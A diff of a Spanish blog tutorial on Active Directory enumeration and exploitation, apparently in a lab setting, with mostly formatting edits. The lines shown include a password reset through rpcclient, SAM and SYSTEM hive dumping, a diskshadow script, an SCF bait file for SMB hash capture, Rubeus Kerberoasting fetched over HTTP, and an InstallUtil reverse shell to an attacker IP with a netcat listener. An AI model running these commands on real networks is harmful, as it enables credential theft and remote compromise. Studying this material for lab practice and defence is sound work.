@@ -2,7 +2,7 @@
 title: "Enumeracion y explotacion de Active Directory"
 date: Sat Aug 03 2024 02:00:00 GMT+0200 (Central European Summer Time)
 categories: [Tutoriales, Active Directory]
-tags: [windows, active-directory, crackmapexec, cme, smbmap, kerbrute, impacket, rpcclient, ldapdomaindum, bloodhound, evilwinrm, samdump2, diskshadow, rubeus, sharphound, chisel, oscp]
+tags: [windows, active-directory, crackmapexec, cme, smbmap, kerbrute, impacket, rpcclient, ldapdomaindum, bloodhound, asreproast, evilwinrm, samdump2, diskshadow, rubeus, sharphound, chisel, oscp]
 image: /assets/img/cabeceras/active-directory-logo.png
 ---
 
@@ -155,14 +155,15 @@ $ rpcclient -U 'john%mypassword123' 10.10.10.50
 
 $ rpcclient $> setuserinfo2 audit2020 23 'Contraseña123'
 ```
-```
+
 OTRAS OPCIONES:
+```
 rpcclient //10.10.10.50 -U "nombre_de_usuario%contraseña" -c 'setuserinfo2 audit2020 23 "Contraseña123"'
 ...
 rpcclient -c 'setuserinfo2 audit2020 23 "Contraseña123"' 10.10.10.50
 ```
-[El número `23` en el comando `setuserinfo2` de `rpcclient` se refiere al nivel de información del usuario que deseas establecer](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration)[1](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration). [En este caso, el nivel `23` se utiliza para cambiar la contraseña de un usuario](https://medium.com/@jackleed/hack-the-box-writeup-4-blackfield-832bb9b5cef4)
-```
+El número `23` en el comando `setuserinfo2` de `rpcclient` se refiere al nivel de información del usuario que deseas establecer (https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration) (https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration). En este caso, el nivel `23` se utiliza para cambiar la contraseña de un usuario (https://medium.com/@jackleed/hack-the-box-writeup-4-blackfield-832bb9b5cef4)
+
 
 4. Otra manera:
 
@@ -265,7 +266,7 @@ PRIVILEGES INFORMATION
 
 1. Vamos a seguir extrayendo información con *Evil-WinRM*:
 
-```PS
+```shell
 Evil-WinRM PS C:\Users\svc_backup\Desktop> reg save HKLM\system system
 The operation completed successfully.
 ...
@@ -295,7 +296,8 @@ $ samdump2 system sam
 
 2. Primero creamos el archivo que usaremos para *diskshadow*, para ello crearemos el archivo diskshadow.txt con el siguiente contenido:
 
-```diskshadow.txt
+```txt
+[diskshadow.txt]
 set context persistent nowriters
 add volume c: alias caracola
 create
@@ -338,7 +340,7 @@ Evil WinRM Shell v.3.4
 
 #### PONER CEBO DE PARA AUTENTICACIÓN SMB:
 
-1. ·En una de las carpetas compartidas donde tengamos permisos de escritura, crearemos un archivo con extensión .scf (por ejemplo miraesto.scf) con el siguiente contenido:
+1. En una de las carpetas compartidas donde tengamos permisos de escritura, crearemos un archivo con extensión .scf (por ejemplo miraesto.scf) con el siguiente contenido:
 
 ```bash
 [shell]
@@ -397,7 +399,7 @@ $ sudo python3 -m http.server 8080
 
 7. En este caso descargaremos una versión de *Rubeus* ya compilada https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe y lo llevaremos a nuestra máquina víctima.
 
-```PS
+```shell
 > iwr -uri http://10.10.14.200:8080/Rubeus.exe -Outfile .\Rubeus.exe
 ....
 > .\Rubeus.exe kerberoast /creduser:contoso.local\amanda /credpassword:miSuperPassword123
@@ -407,7 +409,7 @@ $ sudo python3 -m http.server 8080
 
 8. También vamos a ejecutar *SharpHound* (https://github.com/BloodHoundAD/SharpHound) que nos permitirá volver a volcar toda la información del dominio para poder analizarla de nuevo. Para ello copiaremos el binario dentro de la máquina víctima mediante el procedimiento descrito en el punto número 7.
 
-```PS
+```shell
 > Import-module .\SharpHound.ps1 
 ....
 Importing *.ps1 files as modules is not allowed in ConstrainedLanguage Mode.
@@ -420,11 +422,11 @@ Importing *.ps1 files as modules is not allowed in ConstrainedLanguage Mode.
 ```shell
 $ rlwrap nc -nlvp 443
 ```
+10. Descargamos el binario y lo pasamos a la máquina víctima y lo ejecutamos. Más info de *PsByPassCLM* [aquí](https://github.com/padovah4ck/PSByPassCLM)
 
-10. Descargamos el binario y lo pasamos a la máquina víctima y lo ejecutamos. Más info de *PsByPassCLM* aquí  https://github.com/padovah4ck/PSByPassCLM.
-11. Descarga binario compilado: https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe
+11. [Descarga binario compilado](https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe)
 
-```PS
+```shell
 > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.4 /rport=443 /U C:\Windows\Temp\CLM\PsBypassCLM.exe
 ```
 
@@ -436,7 +438,7 @@ $ rlwrap nc -nlvp 443
 
 1. Con *Rubeus* podemos generar el TGS para posteriormente crackearlo como hemos hecho un poco más arriba...
 
-```PS
+```shell
 > .\Rubeus.exe kerberoast /creduser:contoso.local\amanda /credpassword:miSuperPassword123
 ....
 ```
@@ -451,7 +453,7 @@ $ chisel server --reverse -p 1234
 
 - Del lado la máquina víctima iniciaremos *chisel.exe* para mapear los puertos 88 y 389 TCP:
 
-```PS
+```shell
 > chisel.exe client 10.10.14.44:1234 R:88:127.0.0.1:88 R:389:127.0.0.1:389
 ```
 
